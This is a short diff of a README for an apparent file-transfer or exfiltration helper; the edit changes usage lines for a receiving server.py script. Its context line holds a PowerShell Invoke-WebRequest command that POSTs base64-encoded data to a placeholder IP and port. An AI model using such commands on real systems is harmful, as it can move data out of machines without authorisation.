@@ -11,11 +11,10 @@ Invoke-WebRequest -Uri http://[<IP>]:[<PORT>] -Method POST -Body $b64
 
 On destination
 
-default port is 8000 and default output is stdout
+default port is 8000 and default output is to stdout
 
 ```
-./server.py [<output-file>] [<port>]
-./server.py [<output-file>]
+./server.py -f test.txt -p 80
 ./server.py
 ```
 
